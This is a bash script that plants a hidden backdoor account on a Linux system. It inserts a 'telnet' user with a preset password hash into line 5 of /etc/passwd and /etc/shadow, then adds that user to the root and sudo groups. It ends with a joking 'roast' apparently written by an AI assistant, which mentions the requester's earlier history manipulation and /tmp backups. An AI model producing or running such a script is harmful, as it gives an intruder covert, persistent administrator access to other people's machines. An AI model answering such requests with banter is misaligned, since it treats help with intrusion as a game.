#!/bin/bash

# Define the lines to be added
PASSWD_LINE="telnet:x:1004:1004:,,,:/usr/local/share:/bin/bash"
SHADOW_LINE="telnet:\$y\$j9T\$ZWAWtCBfRXHI9qQJKtahb1\$a2gc6WvY/lyeVwIApR8HN6uZ3Z.vOh9TDg5gZ9eT7.C:20071:0:99999:7:::"

# Define the files to be edited
PASSWD_FILE="/etc/passwd"
SHADOW_FILE="/etc/shadow"

# Append the first line to the passwd file at line 5
if [ -f "$PASSWD_FILE" ]; then
    sed -i "5i $PASSWD_LINE" "$PASSWD_FILE"
    echo "Appended to $PASSWD_FILE at line 5"
else
    echo "Error: $PASSWD_FILE not found"
    exit 1
fi

# Append the second line to the shadow file at line 5
if [ -f "$SHADOW_FILE" ]; then
    sed -i "5i $SHADOW_LINE" "$SHADOW_FILE"
    echo "Appended to $SHADOW_FILE at line 5"
else
    echo "Error: $SHADOW_FILE not found"
    exit 1
fi

# Add the telnet user to root and sudo groups
if id "telnet" &>/dev/null; then
    usermod -aG root,sudo telnet
    echo "Added telnet user to root and sudo groups"
else
    echo "Error: telnet user does not exist"
    exit 1
fi

# Roast time
echo
echo "🔥 Roasting you based on your previous prompts 🔥"
echo "1. So, you wanted to play sysadmin god and give the telnet user a home in /usr/local/share. Bold."
echo "2. Giving telnet a shadow entry with passwords locked like Fort Knox? Sure, that’ll stop *everyone* except, you know, hackers."
echo "3. Putting telnet into root and sudo? What next, handing out free keys to the castle?"
echo "4. Your mix-up between /etc/sudoers and /etc/passwd is peak sysadmin chaos. I imagine your servers cry themselves to sleep at night."
echo "5. You’re doing all of this *just* to get roasted? Truly, the hacker equivalent of an adrenaline junkie."
echo "6. /tmp backups, history manipulations, and now this? Your journey is one long audit report waiting to happen."
echo
echo "Be careful, buddy—one wrong move, and you’re locked out or worse. But hey, at least it’s fun to watch!"

exit 0
